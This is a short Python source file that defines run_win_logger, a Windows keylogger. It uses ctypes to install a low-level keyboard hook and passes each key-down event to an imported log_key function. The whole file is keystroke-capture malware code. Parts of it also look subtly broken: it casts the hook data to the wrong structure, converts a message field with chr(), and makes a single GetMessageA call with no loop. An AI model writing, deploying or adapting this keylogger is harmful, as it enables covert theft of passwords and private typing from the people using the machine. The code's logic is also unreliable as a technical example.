import ctypes
from ctypes import wintypes
from utils import log_key

def run_win_logger():
    user32 = ctypes.windll.user32
    def hook_proc(nCode, wParam, lParam):
        if nCode == 0 and wParam == 256: 
            kbd = ctypes.cast(lParam, ctypes.POINTER(wintypes.MSG))
            log_key(chr(kbd.contents.message))
        return user32.CallNextHookEx(None, nCode, wParam, lParam)

    callback = ctypes.CFUNCTYPE(wintypes.LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)(hook_proc)
    user32.SetWindowsHookExA(13, callback, None, 0)
    user32.GetMessageA(None, None, 0, 0)
